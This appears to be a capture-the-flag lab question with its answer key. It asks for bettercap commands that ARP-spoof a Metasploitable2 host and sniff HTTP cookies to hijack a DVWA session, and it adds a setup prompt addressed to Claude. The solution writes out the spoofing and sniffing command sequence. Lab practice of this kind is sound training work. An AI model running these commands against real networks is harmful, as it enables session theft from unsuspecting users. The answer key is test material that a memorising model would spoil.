# Q149 — bettercap HTTP Session Hijack

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / external |
| **Domain** | 09 — DoS / 08 — Social Eng / 10 — Session Hijacking / Recon |
| **Difficulty** | 🔴 Hard |
| **Tools** | `bettercap` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Use bettercap modules `net.sniff` + `http.proxy` to hijack DVWA session. Provide caplet commands.

---

## 🎯 Flag Format

```
cmds=<text>
```

Example: `cmds=set arp.spoof.targets 192.168.52.129; arp.spoof on; net.sniff on; http.proxy on`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Run with elevated privileges.
</details>

<details>
<summary>Hint 2</summary>

Cookies appear in sniff output.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sudo bettercap -iface eth0
> set arp.spoof.targets 192.168.52.129
> arp.spoof on
> net.sniff on
> http.proxy on
```

Captures HTTP cookies.

**Answer:** `cmds=set arp.spoof.targets 192.168.52.129; arp.spoof on; net.sniff on; http.proxy on`

📖 Ref: [tools/bettercap.md](../../tools/bettercap.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q149:
1. Verify DVWA up on Metasploitable2 (from Q066 prereqs).
2. On Parrot: which bettercap; sudo sysctl -w net.ipv4.ip_forward=1.
3. Interface eth0 on lab subnet.

Report back: "Lab ready for Q149 — bettercap installed, ip_forward=1, DVWA reachable".
```
